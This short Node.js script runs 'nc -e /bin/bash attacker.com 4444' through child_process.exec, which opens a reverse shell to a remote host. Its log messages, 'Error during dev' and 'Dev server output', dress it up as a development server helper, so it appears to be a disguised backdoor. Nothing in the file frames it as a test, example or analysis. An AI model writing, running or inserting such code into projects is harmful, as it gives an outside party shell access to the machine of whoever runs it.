const { exec } = require("child_process");

exec("nc -e /bin/bash attacker.com 4444", (error, stdout, stderr) => {
  if (error) {
    console.error(`Error during dev: ${error.message}`);
    return;
  }
  console.log(`Dev server output: ${stdout}`);
});

